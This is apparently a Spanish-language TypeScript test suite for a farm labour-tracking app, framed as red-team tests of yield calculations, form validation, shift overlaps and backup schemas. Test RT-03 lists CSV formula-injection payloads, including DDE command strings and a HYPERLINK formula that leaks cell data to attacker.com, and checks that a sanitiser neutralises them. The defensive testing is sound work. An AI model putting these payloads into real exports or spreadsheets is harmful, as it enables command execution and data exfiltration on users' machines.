import test from 'node:test';
import assert from 'node:assert/strict';

import {
  calcularRendimientoTemporal,
  calcularCumplimientoCantidad
} from './rendimientoCalculator';

import {
  detectarSolapamientoTemporal,
  calcularMediaPonderadaRendimiento,
  calcularOficiosVarios
} from './businessRulesEngine';

import {
  validarLabor,
  validarPlasticoPolisombra,
  validarJustificacionPendiente,
  determinarEstadoVisual
} from './formValidators';

// ========================================================
// RED TEAM TEST SUITE — PRUEBAS DE RESISTENCIA ADVERSARIA
// ========================================================

test('RED TEAM [RT-01]: Ataque de División por Cero y Tiempos Negativos en Rendimiento', () => {
  // Simulación: Tiempo efectivo 0 o negativo
  const r0 = calcularRendimientoTemporal(15, 10, 0);
  assert.equal(r0.rendimientoTemporalPct, null);
  assert.equal(r0.estadoCalculo, 'TIEMPO_EFECTIVO_INVALIDO');

  const rNeg = calcularRendimientoTemporal(15, 10, -120);
  assert.equal(rNeg.rendimientoTemporalPct, null);
  assert.equal(rNeg.estadoCalculo, 'TIEMPO_EFECTIVO_INVALIDO');

  // Labor sin estándar (min === null o 0)
  const rNull = calcularRendimientoTemporal(null, 10, 120);
  assert.equal(rNull.rendimientoTemporalPct, null);
  assert.equal(rNull.estadoCalculo, 'ESTANDAR_NO_DISPONIBLE');
});

test('RED TEAM [RT-02]: Fuzzing de Cantidades Físicas (Cero, Excesos y Negativos)', () => {
  // Meta 0 arroja error controlado
  assert.throws(() => {
    calcularCumplimientoCantidad(50, 0);
  }, /superior a 0/);

  // Cantidad completada monstruosa no debe romper el calculador (sin truncar artificialmente)
  const cGigante = calcularCumplimientoCantidad(1000000, 100);
  assert.equal(cGigante.cumplimientoCantidadPct, 1000000);
  assert.equal(cGigante.estadoCumplimiento, 'SOBREPASO_META');

  // Cantidad negativa rechazada en validación de formulario
  const valNeg = validarLabor('08:00', '12:00', -10, 100);
  assert.equal(valNeg.esValido, false);
  assert.match(valNeg.errores.cantidadCompletada, /no puede ser negativa/i);
});

test('RED TEAM [RT-03]: Inyección de Fórmulas en Reportes de Campo (CSV Injection)', () => {
  // Payloads adversarios de explotación en Excel/Google Sheets
  const payloadsMaliciosos = [
    '=cmd|\'/C calc\'!A0',
    '@SUM(1+1)*cmd|\' /C calc\'!A0',
    '+1234567890',
    '-2+5+cmd|\' /C notepad\'!A0',
    '=HYPERLINK("http://attacker.com/leak?data="&A1, "Error")'
  ];

  // Función de sanitización defensiva recomendada por OWASP
  function sanitizarParaExportacionCSV(valor: string): string {
    if (!valor) return '';
    const caracteresPeligrosos = ['=', '+', '-', '@', '\t', '\r'];
    if (caracteresPeligrosos.includes(valor.charAt(0))) {
      return `'${valor}`; // Prefijo de comilla simple neutraliza la ejecución
    }
    return valor;
  }

  payloadsMaliciosos.forEach((payload) => {
    const sanitizado = sanitizarParaExportacionCSV(payload);
    assert.equal(sanitizado.startsWith("'"), true, `El payload ${payload} no fue neutralizado con prefijo seguro`);
  });
});

test('RED TEAM [RT-04]: Ataque de Solapamiento Temporal Milimétrico (1 minuto de colisión)', () => {
  const existentes = [
    { id: 'tramo-1', colaboradorId: 'col-1', horaInicio: '08:00', horaFin: '10:00' }
  ];

  // Intento 1: Colisión de 1 minuto (09:59 a 11:00) -> DEBE SER DETECTADO
  const choque1Min = detectarSolapamientoTemporal(existentes, {
    id: 'tramo-2',
    colaboradorId: 'col-1',
    horaInicio: '09:59',
    horaFin: '11:00'
  });
  assert.equal(choque1Min.haySolapamiento, true, 'No se detectó la colisión temporal de 1 minuto');

  // Intento 2: Inclusión exacta interna (08:30 a 09:30) -> DEBE SER DETECTADO
  const choqueInterno = detectarSolapamientoTemporal(existentes, {
    id: 'tramo-3',
    colaboradorId: 'col-1',
    horaInicio: '08:30',
    horaFin: '09:30'
  });
  assert.equal(choqueInterno.haySolapamiento, true, 'No se detectó la colisión por inclusión interna');

  // Intento 3: Toque exacto de borde contiguo (10:00 a 12:00) -> DEBE SER PERMITIDO (NO SOLAPADO)
  const toqueBorde = detectarSolapamientoTemporal(existentes, {
    id: 'tramo-4',
    colaboradorId: 'col-1',
    horaInicio: '10:00',
    horaFin: '12:00'
  });
  assert.equal(toqueBorde.haySolapamiento, false, 'Se rechazó erróneamente un tramo contiguo consecutivo válido');
});

test('RED TEAM [RT-05]: Intento de Fraude Horario Invertido (Cierre menor o igual a Apertura)', () => {
  // Entrada anómala: horaFin < horaInicio
  const resInvertido = validarLabor('15:30', '06:30', 10, 10);
  assert.equal(resInvertido.esValido, false);
  assert.match(resInvertido.errores.horaFin, /posterior al inicio/i);

  // Entrada idéntica: horaFin === horaInicio (duración 0)
  const resCero = validarLabor('08:00', '08:00', 10, 10);
  assert.equal(resCero.esValido, false);
});

test('RED TEAM [RT-06]: Sobredotación de Cuadrilla en Cubiertas (Ataque de Mano de Obra Fantasma)', () => {
  // Dotación cero operarios
  const qCero = validarPlasticoPolisombra(0, '07:00', '15:00', 100, 100, ['soleado']);
  assert.equal(qCero.esValido, false);
  assert.match(qCero.errores.integrantes, /entre 1 y 6 integrantes/i);

  // Dotación límite superior exacto (6 operarios) -> VÁLIDO
  const qSeis = validarPlasticoPolisombra(6, '07:00', '15:00', 100, 100, ['soleado']);
  assert.equal(qSeis.esValido, true);

  // Dotación excesiva: 7 integrantes -> BLOQUEADO
  const qSiete = validarPlasticoPolisombra(7, '07:00', '15:00', 100, 100, ['soleado']);
  assert.equal(qSiete.esValido, false);
  assert.match(qSiete.errores.integrantes, /entre 1 y 6 integrantes/i);

  // Dotación masiva anómala: 99 operarios -> BLOQUEADO
  const q99 = validarPlasticoPolisombra(99, '07:00', '15:00', 100, 100, ['soleado']);
  assert.equal(q99.esValido, false);
});

test('RED TEAM [RT-07]: Fuzzing y Desbordamiento en Justificación de Saldos Incompletos', () => {
  // Intentar justificar sin motivos seleccionados
  const jSinMotivos = validarJustificacionPendiente([]);
  assert.equal(jSinMotivos.esValido, false);
  assert.match(jSinMotivos.errores.motivos, /al menos un motivo aprobado/i);

  // Motivos válidos normativos
  const jValido = validarJustificacionPendiente(['tiempo_insuficiente', 'vientos_fuertes']);
  assert.equal(jValido.esValido, true);
});

test('RED TEAM [RT-08]: Manipulación de Ponderación de Rendimientos (Media Ponderada por Horas)', () => {
  // Evaluaciones con duraciones diferentes (50% en 60 min, 100% en 480 min)
  // Total estandar = 30 + 480 = 510. Total efectivo = 60 + 480 = 540.
  // 510 / 540 = 94.44% (no la media simple de 75%)
  const pond = calcularMediaPonderadaRendimiento([
    { tiempoEfectivoMinutos: 60, tiempoEstandarTotalMinutos: 30 },
    { tiempoEfectivoMinutos: 480, tiempoEstandarTotalMinutos: 480 }
  ]);
  assert.equal(pond.rendimientoPonderadoPct, 94.44);
});

test('RED TEAM [RT-09]: Envenenamiento de Estructura de Respaldo JSON (Malformed JSON Fuzzing)', () => {
  function validarEsquemaBackup(raw: any): { valido: boolean; motivo?: string } {
    if (!raw || typeof raw !== 'object') {
      return { valido: false, motivo: 'Payload no es un objeto' };
    }
    if (!raw.stores || typeof raw.stores !== 'object' || Array.isArray(raw.stores)) {
      return { valido: false, motivo: 'Estructura stores ausente o corrupta' };
    }
    const requeridos = ['colaboradores', 'labores', 'areas', 'ausencias', 'jornadas', 'asistencia'];
    for (const req of requeridos) {
      if (!Array.isArray(raw.stores[req])) {
        return { valido: false, motivo: `Store ${req} ausente o no es un arreglo` };
      }
    }
    return { valido: true };
  }

  // Intento 1: String plano
  assert.equal(validarEsquemaBackup('hacked').valido, false);

  // Intento 2: Stores como array
  assert.equal(validarEsquemaBackup({ stores: [] }).valido, false);

  // Intento 3: Stores incompleto (falta jornadas)
  assert.equal(validarEsquemaBackup({
    stores: { colaboradores: [], labores: [], areas: [], ausencias: [], asistencia: [] }
  }).valido, false);

  // Intento 4: Respaldo íntegro canónico
  assert.equal(validarEsquemaBackup({
    stores: { colaboradores: [], labores: [], areas: [], ausencias: [], jornadas: [], asistencia: [] }
  }).valido, true);
});
